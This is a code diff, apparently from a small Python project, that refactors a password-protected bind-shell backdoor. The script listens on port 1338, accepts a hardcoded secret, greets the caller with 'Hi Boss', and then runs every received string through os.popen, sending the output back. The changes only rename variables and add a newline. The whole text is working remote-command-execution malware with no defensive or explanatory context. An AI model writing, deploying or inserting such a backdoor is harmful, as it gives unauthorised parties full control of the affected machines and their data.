@@ -5,18 +5,18 @@ host = "127.0.0.1"
 port = 1338
 secret = "<!@#n<>!@$b"
 while True:
-                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-                s.bind((host,port))
-                s.listen(100)
+                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                sock.bind((host,port))
+                sock.listen(100)
                 Data = 1
                 while Data == 1:
-                       c,addr=s.accept()
-                       DD = str(c.recv(1024)).strip("\n")
+                       client,address=sock.accept()
+                       DD = str(client.recv(1024)).strip("\n")
                        if DD == secret:
-                        c.send('[+] Hi Boss :D')
+                        client.send('[+] Hi Boss :D\n')
                         while True:
-                                data=c.recv(1024)
+                                data=client.recv(1024)
                                 for line in os.popen(data):
-                                        c.send(line)
+                                        client.send(line)
                        else:
                          a = 0
